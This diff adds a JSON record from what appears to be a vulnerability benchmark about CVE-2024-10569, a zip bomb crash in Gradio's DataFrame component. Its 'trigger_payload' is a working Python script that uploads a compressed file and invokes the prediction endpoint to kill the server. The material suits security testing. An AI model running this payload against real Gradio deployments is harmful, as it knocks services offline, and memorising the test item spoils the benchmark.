@@ -1,0 +1,15 @@
+{
+  "file_id": "361_gradio_huntr_7192bcbb-08a3-4d22-a321-9c6d19dbfc74",
+  "numeric_id": "361",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Zip bomb attack via pd.read_csv in DataFrame component leads to server crash",
+  "cve": "CVE-2024-10569",
+  "cwe": "CWE-475: Undefined Behavior for Input to API",
+  "library": "gradio",
+  "affected_version": "git 98cbcae",
+  "vulnerable_function": "pd.read_csv",
+  "triggerability": "indirect",
+  "trigger_payload": "import requests\nimport json\nurl = \"http://127.0.0.1:7860/\"\nfile_path = \"/tmp/1.gz\"\nwith open(file_path, 'rb') as f:\n    files = {'files': (file_path, f)}\n    response = requests.post(url+'upload?upload_id=j09xz0yd9x', files=files)\nupload_path = json.loads(response.text)[0]\ndata = json.dumps({\n    \"data\": [\n        {\n            \"path\": upload_path,\n            \"meta\": {\n                \"_type\": \"gradio.FileData\"\n            }\n        }\n    ],\n    \"event_data\": None,\n    \"fn_index\": 0,\n    \"trigger_id\": 10,\n    \"session_hash\": \"wucg07y29u\"\n})\nresponse = requests.post(url+'run/predict', data=data)",
+  "oracle": "server crashes with sigkill"
+}
